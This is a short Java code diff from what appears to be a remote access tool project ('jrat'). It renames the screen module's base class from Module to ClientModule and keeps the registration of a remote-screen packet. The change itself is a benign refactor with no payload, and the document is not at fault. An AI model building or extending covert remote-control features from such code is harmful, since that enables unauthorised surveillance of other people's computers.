@@ -1,9 +1,9 @@
 package jrat.module.screen;
 
-import jrat.api.Module;
+import jrat.api.ClientModule;
 import jrat.client.packets.incoming.IncomingPackets;
 
-public class ScreenClientModule extends Module {
+public class ScreenClientModule extends ClientModule {
 
     public void init() throws Exception {
         IncomingPackets.register((short) 12, Packet12RemoteScreen.class);
